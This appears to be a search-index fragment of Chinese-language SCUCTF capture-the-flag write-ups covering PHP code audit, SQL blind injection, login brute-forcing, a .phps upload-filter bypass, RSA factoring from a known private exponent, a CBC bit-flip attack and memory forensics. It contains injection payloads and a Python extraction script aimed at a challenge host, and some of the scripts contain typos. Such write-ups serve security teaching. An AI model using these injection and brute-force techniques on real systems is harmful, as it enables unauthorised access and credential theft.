XSS"},{"location":"WriteUp/2018/Web/#_3","text":"\u8003\u67e5\u8981\u70b9\uff1a PHP \u4ee3\u7801\u5ba1\u8ba1 \u5229\u7528 php \u5f31\u7c7b\u578b\u8bed\u8a00\u7684\u5224\u65ad\u6f0f\u6d1e\uff0c\u7528\u54c8\u5e0c\u503c\u5f00\u5934\u662f 0e \u7684\u6784\u9020 payload; \u83b7\u53d6\u542b\u6709 flag \u94fe\u63a5\u7684\u7f51\u9875\uff0c\u70b9\u8fdb\u53bb\u53d1\u73b0\u6ca1\u6709\u8bbf\u95ee\u6743\u9650\u3002\u5c1d\u8bd5\u5404\u79cd\u65b9\u6cd5\u66f4\u6539 http \u5934\u90e8\u5185\u5bb9\uff0c\u6dfb\u52a0 refer,\u66f4\u6539 cookie\u2026\u2026Burpsuit \u6293\u5305\u66f4\u6539 permission \u4e3a nqzva(rot13 \u52a0\u5bc6\u540e\u7684 admin) Burpsuit \u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86\u6587\u4ef6\u7684\u94fe\u63a5\uff0c\u76f4\u63a5\u8bbf\u95ee\u94fe\u63a5\u5e76\u6ca1\u6709\u4e1c\u897f\u3002\u518d\u5c06\u8bf7\u6c42\u653e \u5728 burpsuite \u67e5\u770b\uff0c\u8fd4\u56de too slow\u3002\u8003\u8651\u7528\u811a\u672c\u3001burpsuit \u4e0d\u65ad\u53d1\u5305\u8bf7\u6c42\u3002 Burpsuite\u2014\u2014>Send to Intruder\u2014\u2014>Payload\u2014\u2014>Generate 100 payloads \u2014\u2014>Start attack; \u811a\u672c\u5982\u4e0b import requests r1 = requests . Session () while ( 1 ): r2 = r1 . get ( \"http://120.78.66.77:85/u/18f6dceefd3014a4b73e4b131776afa248ea810c/flag\" ) print ( r2 . text ) \u7136\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"\u4e00\u9053\u5165\u95e8\u7684\u4ee3\u7801\u5ba1\u8ba1"},{"location":"WriteUp/2018/Web/#_4","text":"\u8003\u67e5\u8981\u70b9\uff1a SQL \u6ce8\u5165 \u6253\u5f00\u9898\u76ee\u5730\u5740\uff0c\u53d1\u73b0\u662f\u4e2a\u767b\u5f55\u754c\u9762\uff0c\u5148\u8d70\u6d41\u7a0b\uff0c\u7528\u4ee3\u7897\u5b66\u59d0\u6700\u65b0\u6362\u7684 AWVS10.5 \u626b\u4e00\u626b\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u770b\u770b\u6709\u6ca1\u6709\u6e90\u7801\u6cc4\u6f0f\u6216\u8005\u5176\u4ed6\u53ef\u4ee5\u626b\u5230\u7684\u6f0f\u6d1e\uff0c\u4e00\u822c\u6765\u8bb2\u7528 AWVS \u53ef\u4ee5\u626b\u5230\u4e00\u4e9b\u51fa\u9898\u4eba\u6545\u610f\u7559\u4e0b\u7684\u7ebf\u7d22\uff0c\uff08\u5982 git \u6cc4\u6f0f\uff0csvn \u6cc4\u6f0f\u6216\u8005.bak \u6cc4\u6f0f\u7b49\u7b49\uff09\uff0c\u626b\u63cf\u51fa\u4e86\u51e0\u4e2a\u5217\u76ee\u5f55\u7684\u6f0f\u6d1e\u4f46\u662f\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u3002 \u63a5\u7740\u7528 Burp \u6293\u5305\uff0c\u770b\u770b\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u8fd4\u56de\u7684\u5305\u91cc\u9762\u6709\u4ec0\u4e48\u7ebf\u7d22\uff08burp \u7684\u4f7f\u7528\u6559\u7a0b http://www.uml.org.cn/safe/201406135.asp \uff09\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbe\u7f6e\u6210 burp \u4f7f\u7528\u7684\u4ee3\u7406\uff0c\u7136\u540e\u8bbf\u95ee\u767b\u5f55\u9875\u9762\uff0c\u53d1\u73b0\u4e86\u63d0\u793a\u3002\u987a\u4fbf\u4e00\u63d0\uff0c\u5c3d\u7ba1\u8fd9\u9053\u9898\u4e2d\u51fa\u9898\u4eba\u628a\u63d0\u793a\u85cf\u5728\u4e86\u9875\u9762\u6e90\u7801\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u91cc\u770b\u5230\uff0c\u5927\u5e08\u5176\u4ed6\u9898\u7ed9\u7684\u63d0\u793a\u6709\u53ef\u80fd\u5728 cookies \u751a\u81f3\u670d\u52a1\u5668\u81ea\u5b9a\u4e49\u7684\u8fd4\u56de\u5934\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u4e1c\u897f\u90fd\u80fd\u5728 burp \u7684\u6293\u5305\u4e2d\u770b\u5230\uff0c\u6240\u4ee5\u6211\u4eec\u6700\u597d\u8fd8\u662f\u7528 burp \u6765\u627e hint \u63d0\u793a\u544a\u8bc9\u4e86\u6211\u4eec\u6570\u636e\u5e93\u7684\u4e00\u4e9b\u4fe1\u606f\uff0c\u7ed3\u5408\u9898\u76ee\u53ef\u4ee5\u731c\u5230\u662f\u8981\u6211\u4eec\u901a\u8fc7 SQL \u6ce8\u5165\u6765\u83b7\u53d6\u5bc6\u7801\u3002 \u6d4b\u8bd5\u8fd9\u9053\u9898\u5bf9\u4e0a\u4f20\u6570\u636e\u7684\u9650\u5236\uff0c\u6211\u4eec\u9996\u5148\u53d1\u73b0\u5982\u679c\u6211\u4eec\u63d0\u4ea4\u7684\u6570\u636e\u4e2d\u5904\u51fa\u73b0\u4e86\u5173\u952e\u5b57\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de naive\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u5668\u662f\u5426\u8fd4\u56de na\u00efve \u6765\u6d4b\u8bd5\u4e00\u4e2a\u5173\u952e\u5b57\u662f\u5426\u88ab\u7981\u6b62\uff0c\u7ecf\u8fc7\u624b\u52a8\u6d4b\u8bd5\uff08\u5176\u5b9e\u6700\u597d\u81ea\u5df1\u51c6\u5907\u4e00\u4efd\u5b57\u5178\u7528 burp \u6279\u91cf\u6d4b\u8bd5\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u88ab\u7981\u6b62\u7684\u5173\u952e\u5b57\u6709\uff1aunion select from where and \u4ee5\u53ca\u7a7a\u683c\u548c\u7a7a\u683c\u7684\u5404\u7c7b\u66ff\u4ee3\uff08%0a %0b /**/\u4e4b\u7c7b\uff09 substr \u8fd8\u6709/*\u3002\u5404\u7c7b\u7ed5\u8fc7\u624b\u6bb5\u5747\u65e0\u6548\uff0c\u5982\u5927\u5c0f\u5199\u66ff\u6362\uff0cURL \u7f16\u7801 \u770b\u4f3c\u65e0\u89e3\u7684\u9898\u76ee\u5728\u6709 hint \u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u4ecd\u65e7\u80fd\u591f\u6784\u9020\u8bed\u53e5\u6765\u7ed5\u8fc7\u5b83\u3002\u5728\u6211\u4eec\u53d1\u52a8 SQL \u6ce8\u5165\u653b\u51fb\u524d\uff0c\u6211\u4eec\u8981\u9996\u5148\u5224\u65ad\u8fd9\u4e2a\u6ce8\u5165\u70b9\u7684\u7c7b\u578b\uff0c\u4e00\u822c\u7684\u6ce8\u5165\u6709 UNION \u6ce8\u5165\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u5e03\u5c14\u6ce8\u5165\uff0c\u4ee5\u53ca\u65f6\u95f4\u5dee\u6ce8\u5165\uff08\u7c7b\u4f3c DNS \u6ce8\u5165\u7684\u9ed1\u79d1\u6280\u5148\u4e0d\u7ba1\uff09\u3002 \u8fd9\u9053\u9898\u628a Union \u5173\u952e\u5b57\u7ed9\u9650\u5236\u4e86\uff0c\u8fd8\u4e0d\u62a5\u9519.\u56e0\u6b64\u6211\u4eec\u9996\u5148\u8003\u8651\u5e03\u5c14\u6ce8\u5165\u3002\u5e03\u5c14\uff08BOOL) \u8fd9\u4e2a\u542c\u8d77\u4f86\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u8bf4\u767d\u4e86\u5c31\u662f\u6784\u9020\u5224\u65ad\u8bed\u53e5\u8ba9\u670d\u52a1\u5728\u8bed\u53e5\u7ed3\u679c\u4e3a\u771f\u6216\u8005\u4e3a\u5047\u7684\u65f6\u5019 \u8fd4\u518b\u4e0d\u540c\u7ed3\u679c\uff0c\u636e\u6b64\u6765\u83b7\u53d6\u4fe1\u606f\u3002 \u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u7528\u6237\u540d\u8f93\u5165 admin\uff0c\u5bc6\u7801\u4e71\u8f93\uff0c\u4f1a\u63d0\u793a\u6211\u4eec password error,\u4f46\u5982\u679c\u662f\u5176\u5b83\u7528 \u6237\u540d\uff0c\u5b83\u5c31\u4f1a\u63d0\u793a no such user\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u53ef\u4ee5\u5728\u7528\u6237\u540d\u90a3\u91cc\u4e0b\u624b\u6ce8\u5165\u3002 \u6d4b\u8bd5\u53d1\u73b0\u7528\u6237\u540d\u4e3a admin\u2019&&(1)# \u4e3a password error\uff0c\u4e3a admin\u2019&&(0)#\u65f6\u4e3a no such user,\u5e03\u5c14\u6ce8\u5165\u5b9e\u9524\uff01\u8fd9\u4e2a&&\u7684\u610f\u601d\u662f\u548c\uff0c\u53ef\u4ee5\u4ee3\u66ff and\uff0c\u800c#\u662f\u6ce8\u91ca\u7b26\u53f7\u7528\u4e8e\u6ce8\u91ca\u540e\u9762\u7684\u8bed\u53e5\u3002 \u6211\u4eec\u53ef\u4ee5\u5047\u5b9a\u8fd9\u4e2a\u767b\u5f55\u8bed\u53e5\u662f\u8fd9\u6837\u7684 select pwd from table name where uname= \u2019\u4f60\u8f93\u5165\u7684\u2019 \u628a\u521a\u521a\u8f93\u5165\u7684\u4ee3\u8fdb\u53bb\u5c31\u662f select pwd from table_name where uname=\u2019adminl&&(1)#' ,\u5982\u679c\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u4e3a\u771f\uff08\u975e 0)\u5c31\u80fd\u591f\u8fd4\u56de\u7ed3\u679c\uff08password error)\uff0c\u4e0d\u80fd\u7684\u8bdd\u5c31\u65e0\u6cd5\u8fd4\u56de (no such user) \u73b0\u5728\u5f00\u59cb\u5c1d\u8bd5\u628a\u521a\u624d\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u6362\u6210 length(pwd),\u8fd9\u4e2a length \u51fd\u6570\u53ef\u4ee5\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6,\u6574\u4e2a\u8bed\u53e5\u5c31\u6210\u4e86 select pwd from table_name where uname='adminl&&(length(pwd) )#\u2019 \u8fd4\u56de\u7684\u662f password error! \u8fd9\u8bf4\u660e pwd \u771f\u7684\u5b58\u5728\uff0c\u800c\u4e14\u53ef\u8bbf\u95ee\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u52a0\u4e0a\u5404\u7c7b\u5224\u65ad\u8bed\u53e5\u6765\u5224\u65ad pwd \u7684\u957f\u5ea6 \u4e8e\u662f\u5c31\u75af\u72c2\u6d4b\u8bd5 \u5728\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u65b9\u4fbf\u8d77\u89c1.\u53ef\u4ee5\u628a\u6293\u5230\u7684\u767b\u5f55\u5305\u653e\u5728 Burp \u7684 repeater \u4e2d\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u628a& \u6362\u6210\uff0526,\u5426\u5219\u670d\u52a1\u5668\u4f1a\u628a&\u540e\u9762\u7684\u5f53\u4f5c\u53e6\u4e00\u4e2a\u4e0a\u4f20\u7684\u53c2\u6570\u3002\u53d1\u73b0\u8fd9\u4e2a\u5bc6\u7801\u957f\u5ea6\u4e3a 30 (\u5988\u7684\u771f\u591f\u957f\uff09 \u6211\u4eec\u73b0\u5728\u9700\u8981\u8003\u8651\u5982\u4f55\u8dd1\u51fa\u6570\u636e\u4e2b\uff0c\u6b63\u5e38\u7684\u5e03\u5c14\u6ce8\u5165\u9700\u8981\u7528 substr \u51fd\u6570\u4e00\u4e2a\u4e00\u4e2a\u5730\u53d6\u6570\u636e \uff0c\u4f46\u662f\u6211\u4eec\u7684 substr \u88ab\u7981\u4e86\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u8fd8\u6709 left \u548c right \u51fd\u6570\u53ef\u4ee5\u53d6\u3002\u811a\u672c\u5982\u4e0b\uff1a import requests from concurrent.futures import ThreadPoolExecutor from concurrent import futures url = \"http://120.78.66.77:84/fb69d7b4467e33c71b0153e62f7e2bf0/\" head = { \"Content-Type\" : \"application/x-www-form-unlencoded\" } #\u4e0d\u52a0\u4e0a\u670d\u52a1\u5668\u4e0d\u8ba4 data = \"uname=admin' %26% 26ascii(right(left(pwd,curlen),1))-curascii#&pwd=\" pwd = '_' * 31 def Check ( curlen ): global pwd data = \"uname=admin' %26% 26ascii(right(left(pod,curlen),1))BOOL#&pwd=\" . replace ( \"curlen\" , str ( curlen )) #\u5148\u66ff\u6362\u4f4d\u6570 start = 0 end = 255 while start <= end : #\u6b64\u5904\u4e8c\u5206 mid = ( start + end ) // 2 page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"=\" + str ( mid ))) . text if \"error\" in page : pwd = pwd [: curlen ] + chr ( mid ) + pwd [ curlen + 1 :] print ( pwd [ 1 :]) return chr ( mid ) page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"<\" + str ( mid ))) . text if \"error\" in page : end = mid - 1 else start = mid + 1 with ThreadPoolExecutor ( max_workders = 20 ) as executor : futurn_list = list () for curlen in range ( 1 , 31 ): future = executor . submit ( Check , curlen ) future_list . appent ( future ) print ( \"\u5bc6\u7801\u662f\" + pwd [ 1 :])","title":"\u767b\u5f55\u4e00\u4e0b"},{"location":"WriteUp/2018/Web/#_5","text":"\u8003\u67e5\u8981\u70b9\uff1a Linux \u5907\u4efd\u6587\u4ef6\uff0c\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0cPHP \u6587\u4ef6\u540e\u7f00\u540d\u7ed5\u8fc7 \u5148 F12,\u770b\u5230\u63d0\u793a info.php \u53d1\u73b0 info.php \u88ab\u5220\u9664\uff0c\u770b\u770b\u5907\u4efd\u6587\u4ef6.bak \u67e5\u770b\u6587\u4ef6\uff0c\u6307\u660e\u4e86\u7206\u7834\u7684\u65b9\u5f0f\u548c\u8d26\u6237&\u5bc6\u7801\u96c6\u5408\uff0c\u53ea\u662f\u6709\u70b9\u5927\uff0c\u811a\u672c\u751f\u6210\u7206\u7834\u6587\u4ef6\uff0c\u914d\u7f6e\u5230 burp \u91cc\uff0c\u9759\u9759\u7b49\u5f85\u2026\u2026\u2026\u5927\u6982\u51e0\u5341\u5206\u949f\u5427 \u767b\u5f55\u540e\u8ba9\u4e0a\u4f20 PHP \u6587\u4ef6\uff0c\u7531\u6e90\u7801\u53d1\u73b0\u5176\u5b9e\u53ea\u662f\u4e0a\u4f20\u4e86\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u666e\u901a\u7684 php \u6587\u4ef6\u65e0\u6cd5\u4e0a\u4f20\uff0c\u8fd9\u65f6\u60f3\u5230\u4e86 PHP \u7684\u4e00\u79cd\u522b\u540d\uff1aphps,\u4e00\u79cd\u7279\u6b8a\u7684 php \u6587\u4ef6\uff0c\u5f97\u5230 flag","title":"\u4e00\u9053\u8239\u7ec6\u7684\u5916\u90e8\u9898\u76ee"},{"location":"WriteUp/201905/Crypto/","text":"Crypto \u00b6 \u4f5b\u8bf4\uff0c\u8ba9\u4f60\u7b7e\u4e2a\u5230 \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 \u4e0e\u4f5b\u8bba\u7985 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u4f7f\u7528\u4e0e\u4f5b\u8bba\u7985\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u660e\u6587 \u5173\u6ce8SCUCTF\u516c\u4f17\u53f7\u56de\u590dSCUCTF2019\u83b7\u5f97Flag \uff0c\u5173\u6ce8\u516c\u4f17\u53f7\u53d1\u9001\u6307\u5b9a\u6d88\u606f\u5373\u53ef\u83b7\u5f97 flag\u3002 512 \u4f4d RSA \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 RSA \u811a\u672c\u7f16\u5199 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u9898\u76ee\u7ed9\u51fa\u7684\u5df2\u77e5\u6761\u4ef6\u6709 d\uff0cn \u548c e\uff0c\u8981\u6c42\u8ba1\u7b97 p+q \u7684\u54c8\u5e0c\u503c\u3002 \u5148\u8ba1\u7b97 k=d*e-1 k=d*e-1 \uff0c\u5373 k k \u4e3a \\varphi(n) \\varphi(n) \u7684\u500d\u6570 \u968f\u673a\u751f\u6210\u4e00\u4e2a\u4f4d\u4e8e 1 \u5230 n \u4e4b\u95f4\u7684 g\uff0c\u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u751f\u6210\u4e00\u4e2a g\uff0c \u5c06 k \u9664\u4ee5\u4e8c\uff0c\u53d8\u4e3a\u539f\u6765\u7684\u4e00\u534a\uff0c\u8ba1\u7b97 y=g^k\\ mod\\ n y=g^k\\ mod\\ n \u5f53 y \u4e0d\u4e3a 1\uff0c\u5373 k \u4e0d\u662f n \u7684\u6b27\u62c9\u51fd\u6570\u7684\u500d\u6570\uff0c\u4e14 y-1 \u548c n \u4e0d\u4e92\u7d20\u65f6\uff0cp \u548c q \u4e2d\u5176\u4e2d\u4e00\u4e2a\u4e3a y-1 \u548c p \u7684\u6700\u5927\u516c\u56e0\u6570\u3002 \u5982\u679c y \u4e3a 1 \u6216\u8005 y-1 \u4e0e n \u4e92\u7d20\uff0c\u5c31\u91cd\u65b0\u8fdb\u884c\u7b2c\u56db\u6b65\u3002 \u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u6267\u884c\u7b2c\u4e09\u6b65\u3002 import random import hashlib from pwn import * def gcd ( a , b ): if a < b : a , b = b , a while b != 0 : temp = a % b a = b b = temp return a def getpq ( n , e , d ): p = 1 q = 1 while p == 1 and q == 1 : k = d * e - 1 g = random . randint ( 0 , n ) while p == 1 and q == 1 and k % 2 == 0 : k /= 2 y = pow ( g , k , n ) if y != 1 and gcd ( y - 1 , n ) > 1 : p = gcd ( y - 1 , n ) q = n / p return p , q def main ( n , e , d ): p , q = getpq ( n , e , d ) md5 = hashlib . md5 () md5 . update ( str ( p + q )) return md5 . hexdigest () def get_flag ( host , port ): sh = remote ( host , port ) n = sh . recvline () n = n . split ( \"> \" )[ 1 ] n = eval ( n ) e = sh . recvline () e = e . split ( \"> \" )[ 1 ] e = eval ( e ) d = sh . recvline () d = d . split ( \"> \" )[ 1 ] d = eval ( d ) result = main ( n , e , d ) sh . sendline ( result ) print sh . recvline () if __name__ == '__main__' : get_flag ( \"120.78.66.77\" , 16000 ) X \u8ba1\u5212 \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 CBC \u6a21\u5f0f\u4e0b\u7684\u5b57\u8282\u53cd\u8f6c\u653b\u51fb \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6536\u5230\u4e00\u4e2a 16 \u5b57\u8282\u7684\u660e\u6587\u548c CBC \u6a21\u5f0f\u4e0b\u4f7f\u7528 DES\uff0c\u968f\u673a key \u548c iv \u52a0\u5bc6\u7684\u5bc6\u6587\uff0c\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u5bc6\u6587\uff0c\u4f7f\u4e4b\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u5f0f\u89e3\u5bc6\u7ed3\u679c\u672b\u5c3e\u4e3a XXXX DES \u7684\u5206\u7ec4\u4e3a 8 \u5b57\u8282\u4e00\u7ec4\uff0c16 \u5b57\u8282\u521a\u597d\u4e24\u4e2a\u5206\u7ec4\uff0c\u63a5\u4e0b\u6765\u770b CBC \u6a21\u5f0f\u7684\u52a0\u5bc6\u539f\u7406\uff1a \u5373\u6211\u4eec\u53ea\u8981\u5c06\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\uff0c\u4e0e\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\u5f02\u6216\uff0c\u518d\u548c\u56db\u4e2a X \u5f02\u6216\uff0c\u5373\u53ef\u8ba9\u89e3\u5bc6\u4e4b\u540e\u7684\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u540e\u56db\u4e2a\u5b57\u8282\u4e3a X\u3002 # -*- coding: utf-8 -*- from Crypto.Util.number import long_to_bytes cipher = long_to_bytes ( 0x5dcebc74db3fb32b93f6fa4d5c9ec1e506b894a8f424e54 ) plain = \"wdzRBU7eyBqU4Hm4\" cipher = bytearray ( cipher ) cipher [ 4 ] = cipher [ 4 ] ^ ord ( plain [ 12 ]) ^ ord ( \"X\" ) cipher [ 5 ] = cipher [ 5 ] ^ ord ( plain [ 13 ]) ^ ord ( \"X\" ) cipher [ 6 ] = cipher [ 6 ] ^ ord ( plain [ 14 ]) ^ ord ( \"X\" ) cipher [ 7 ] = cipher [ 7 ] ^ ord ( plain [ 15 ]) ^ ord ( \"X\" ) result = \"\" for i in cipher : if len ( hex ( i )) == 4 : result += hex ( i )[ - 2 :] else : result += \"0\" + hex ( i )[ - 1 :] result = \"0x\" + result print result","title":"Crypto"},{"location":"WriteUp/201905/Crypto/#crypto","text":"","title":"Crypto"},{"location":"WriteUp/201905/Crypto/#_1","text":"","title":"\u4f5b\u8bf4\uff0c\u8ba9\u4f60\u7b7e\u4e2a\u5230"},{"location":"WriteUp/201905/Crypto/#_2","text":"\u4e0e\u4f5b\u8bba\u7985","title":"\u8003\u67e5\u8981\u70b9"},{"location":"WriteUp/201905/Crypto/#_3","text":"\u4f7f\u7528\u4e0e\u4f5b\u8bba\u7985\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u660e\u6587 \u5173\u6ce8SCUCTF\u516c\u4f17\u53f7\u56de\u590dSCUCTF2019\u83b7\u5f97Flag \uff0c\u5173\u6ce8\u516c\u4f17\u53f7\u53d1\u9001\u6307\u5b9a\u6d88\u606f\u5373\u53ef\u83b7\u5f97 flag\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Crypto/#512-rsa","text":"","title":"512 \u4f4d RSA"},{"location":"WriteUp/201905/Crypto/#_4","text":"RSA \u811a\u672c\u7f16\u5199","title":"\u8003\u67e5\u8981\u70b9"},{"location":"WriteUp/201905/Crypto/#_5","text":"\u9898\u76ee\u7ed9\u51fa\u7684\u5df2\u77e5\u6761\u4ef6\u6709 d\uff0cn \u548c e\uff0c\u8981\u6c42\u8ba1\u7b97 p+q \u7684\u54c8\u5e0c\u503c\u3002 \u5148\u8ba1\u7b97 k=d*e-1 k=d*e-1 \uff0c\u5373 k k \u4e3a \\varphi(n) \\varphi(n) \u7684\u500d\u6570 \u968f\u673a\u751f\u6210\u4e00\u4e2a\u4f4d\u4e8e 1 \u5230 n \u4e4b\u95f4\u7684 g\uff0c\u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u751f\u6210\u4e00\u4e2a g\uff0c \u5c06 k \u9664\u4ee5\u4e8c\uff0c\u53d8\u4e3a\u539f\u6765\u7684\u4e00\u534a\uff0c\u8ba1\u7b97 y=g^k\\ mod\\ n y=g^k\\ mod\\ n \u5f53 y \u4e0d\u4e3a 1\uff0c\u5373 k \u4e0d\u662f n \u7684\u6b27\u62c9\u51fd\u6570\u7684\u500d\u6570\uff0c\u4e14 y-1 \u548c n \u4e0d\u4e92\u7d20\u65f6\uff0cp \u548c q \u4e2d\u5176\u4e2d\u4e00\u4e2a\u4e3a y-1 \u548c p \u7684\u6700\u5927\u516c\u56e0\u6570\u3002 \u5982\u679c y \u4e3a 1 \u6216\u8005 y-1 \u4e0e n \u4e92\u7d20\uff0c\u5c31\u91cd\u65b0\u8fdb\u884c\u7b2c\u56db\u6b65\u3002 \u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u6267\u884c\u7b2c\u4e09\u6b65\u3002 import random import hashlib from pwn import * def gcd ( a , b ): if a < b : a , b = b , a while b != 0 : temp = a % b a = b b = temp return a def getpq ( n , e , d ): p = 1 q = 1 while p == 1 and q == 1 : k = d * e - 1 g = random . randint ( 0 , n ) while p == 1 and q == 1 and k % 2 == 0 : k /= 2 y = pow ( g , k , n ) if y != 1 and gcd ( y - 1 , n ) > 1 : p = gcd ( y - 1 , n ) q = n / p return p , q def main ( n , e , d ): p , q = getpq ( n , e , d ) md5 = hashlib . md5 () md5 . update ( str ( p + q )) return md5 . hexdigest () def get_flag ( host , port ): sh = remote ( host , port ) n = sh . recvline () n = n . split ( \"> \" )[ 1 ] n = eval ( n ) e = sh . recvline () e = e . split ( \"> \" )[ 1 ] e = eval ( e ) d = sh . recvline () d = d . split ( \"> \" )[ 1 ] d = eval ( d ) result = main ( n , e , d ) sh . sendline ( result ) print sh . recvline () if __name__ == '__main__' : get_flag ( \"120.78.66.77\" , 16000 )","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Crypto/#x","text":"","title":"X \u8ba1\u5212"},{"location":"WriteUp/201905/Crypto/#_6","text":"CBC \u6a21\u5f0f\u4e0b\u7684\u5b57\u8282\u53cd\u8f6c\u653b\u51fb","title":"\u8003\u67e5\u8981\u70b9"},{"location":"WriteUp/201905/Crypto/#_7","text":"\u6536\u5230\u4e00\u4e2a 16 \u5b57\u8282\u7684\u660e\u6587\u548c CBC \u6a21\u5f0f\u4e0b\u4f7f\u7528 DES\uff0c\u968f\u673a key \u548c iv \u52a0\u5bc6\u7684\u5bc6\u6587\uff0c\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u5bc6\u6587\uff0c\u4f7f\u4e4b\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u5f0f\u89e3\u5bc6\u7ed3\u679c\u672b\u5c3e\u4e3a XXXX DES \u7684\u5206\u7ec4\u4e3a 8 \u5b57\u8282\u4e00\u7ec4\uff0c16 \u5b57\u8282\u521a\u597d\u4e24\u4e2a\u5206\u7ec4\uff0c\u63a5\u4e0b\u6765\u770b CBC \u6a21\u5f0f\u7684\u52a0\u5bc6\u539f\u7406\uff1a \u5373\u6211\u4eec\u53ea\u8981\u5c06\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\uff0c\u4e0e\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\u5f02\u6216\uff0c\u518d\u548c\u56db\u4e2a X \u5f02\u6216\uff0c\u5373\u53ef\u8ba9\u89e3\u5bc6\u4e4b\u540e\u7684\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u540e\u56db\u4e2a\u5b57\u8282\u4e3a X\u3002 # -*- coding: utf-8 -*- from Crypto.Util.number import long_to_bytes cipher = long_to_bytes ( 0x5dcebc74db3fb32b93f6fa4d5c9ec1e506b894a8f424e54 ) plain = \"wdzRBU7eyBqU4Hm4\" cipher = bytearray ( cipher ) cipher [ 4 ] = cipher [ 4 ] ^ ord ( plain [ 12 ]) ^ ord ( \"X\" ) cipher [ 5 ] = cipher [ 5 ] ^ ord ( plain [ 13 ]) ^ ord ( \"X\" ) cipher [ 6 ] = cipher [ 6 ] ^ ord ( plain [ 14 ]) ^ ord ( \"X\" ) cipher [ 7 ] = cipher [ 7 ] ^ ord ( plain [ 15 ]) ^ ord ( \"X\" ) result = \"\" for i in cipher : if len ( hex ( i )) == 4 : result += hex ( i )[ - 2 :] else : result += \"0\" + hex ( i )[ - 1 :] result = \"0x\" + result print result","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"WriteUp/201905/Misc/","text":"MISC \u00b6 \u5a49\u59d0\u59d0\u7684\u5185\u5b58\u955c\u50cf \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 \u5185\u5b58\u9690\u5199 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u4f7f\u7528 Volatility \u67e5\u770b\u526a\u5207\u677f\u4fe1\u606f\uff0c\u53d1\u73b0\u4e00\u6bb5 Base64 \u7f16\u7801\uff0c\u4f46\u663e\u793a\u4e0d\u5168\u3002 \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u6587\u4ef6\uff0c\u641c\u7d22\u8fd9\u6bb5 base64 \u7684\u5934 c2NlY3Rm \u83b7\u5f97\u5b8c\u6574\u7684 base64\uff0c\u89e3\u7801\u83b7\u5f97 flag\u3002 \u8c01\u662f\u534f\u4f1a\u6700\u5f3a\u7684\u4eba \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 \u6587\u4ef6\u62fc\u63a5 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u662f\u5f20\u56fe\u7247\uff0c\u663e\u793a\u7684\u662f JS \u4e4b\u7236\uff08\u6240\u4ee5\u653e\u8fd9\u5f20\u56fe\u662f\u4e3a\u63d0\u5021\u5f00\u6e90 \uff09\uff0c\u76f4\u63a5\u62d6\u8fdb HxD \u770b\u770b\u6709\u4ec0\u4e48\uff0c\u62c9\u5230\u6700\u540e\u770b\u5230\uff1a \u5f88\u660e\u663e\u7684 